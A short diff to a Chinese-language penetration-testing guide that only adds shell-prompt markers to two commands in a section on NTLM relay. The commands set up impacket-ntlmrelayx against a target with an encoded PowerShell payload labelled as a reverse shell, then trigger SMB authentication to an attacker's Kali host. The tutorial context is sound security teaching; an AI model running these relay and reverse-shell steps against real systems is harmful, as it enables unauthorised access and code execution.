@@ -957,10 +957,10 @@ Windows Vista 開始引入的安全機制。即使用管理員帳號登入，程
 
 ```bash
 # 啟動 relay（指向目標，附帶 reverse shell 指令）
-impacket-ntlmrelayx --no-http-server -smb2support -t TARGET_IP -c "powershell -enc BASE64..."
+$ impacket-ntlmrelayx --no-http-server -smb2support -t TARGET_IP -c "powershell -enc BASE64..."
 
 # 在來源機器觸發 SMB 認證到 Kali
-dir \\KALI_IP\test
+$ dir \\KALI_IP\test
 ```
 
 條件同 PtH：非內建 Administrator 需目標關閉 UAC remote restrictions。
